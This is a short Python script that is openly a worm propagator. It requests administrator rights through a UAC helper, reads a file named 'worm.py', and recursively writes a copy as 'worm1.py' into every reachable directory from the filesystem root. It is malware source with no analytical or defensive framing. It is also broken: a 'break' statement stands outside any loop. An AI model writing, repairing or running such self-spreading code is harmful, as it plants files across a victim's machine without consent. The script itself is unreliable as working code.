from os import chdir, scandir, getcwd
import UAC

# IF UAC is not given, run.py will not be executed
if not UAC.isUserAdmin():
    UAC.runAsAdmin()

MEMORY_PER_RUN = 4000
WORM_BIN = b""
with open("worm.py", "rb") as infile:
    info = infile.read(MEMORY_PER_RUN)
        
    if info == b"":
        break
    WORM_BIN += info

chdir('/')
def traverse(path):
    # plant worm1.py in the absolute path currently on
    try:
        with open(path+"\worm1.py", "wb") as outfile:
            outfile.write(WORM_BIN)
    except PermissionError:
        pass
        
    with scandir(path) as scanner:
        if scanner:
            directories = [entry for entry in scanner if entry.is_dir()]

            if directories:
                for entry in directories:
                    try:      
                        traverse(entry.path)
                
                    except PermissionError:
                        continue
    return

if __name__ == "__main__":
    traverse(getcwd())
